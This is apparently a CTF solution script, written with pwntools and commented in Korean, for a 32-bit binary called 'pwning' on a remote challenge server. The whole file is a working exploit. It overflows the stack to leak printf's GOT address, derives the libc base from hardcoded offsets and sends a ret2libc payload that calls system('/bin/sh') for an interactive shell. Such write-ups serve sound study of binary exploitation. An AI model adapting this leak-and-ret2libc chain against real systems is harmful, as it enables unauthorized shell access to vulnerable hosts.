from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

context(arch="i386", os='linux')
e = ELF('./pwning')

r = remote("ctf.j0n9hyun.xyz", 3019)


# vuln 함수에 bof 취약점이 있다
# printf 를 이용해 got를 leak해서 libc-database에서 libc를 찾으면 된다.
# 그런데, 해당하는 libc가 없다. 그래서 예전 write up을 참고해서 offset을 구했다.
# libc : libc6-i386_2.23-0ubuntu10_amd64
printf = p32(e.plt['printf'])
main = p32(0x80485b8)

r.recv()

# leak printf address and get base
r.sendline(b"-1")
print(r.recv())

dummy = b"A"*(0x2c+4)
payload  = dummy
payload += p32(e.plt['printf'])
payload += main
payload += p32(e.got['printf'])
print("payload : ", payload)
r.sendline(payload)

print("read : ", r.recv())
printf = u32(r.recv(4))
print("printf : ", hex(printf))
base = printf -	0x049020
system = base + 0x03a940
binsh = base + 0x15902b

print(r.recv())

# RTL, call system
r.sendline(b"-1")
print(r.recv())

payload  = dummy
payload += p32(system)
payload += b"AAAA"
payload += p32(binsh)

r.sendline(payload)

r.interactive()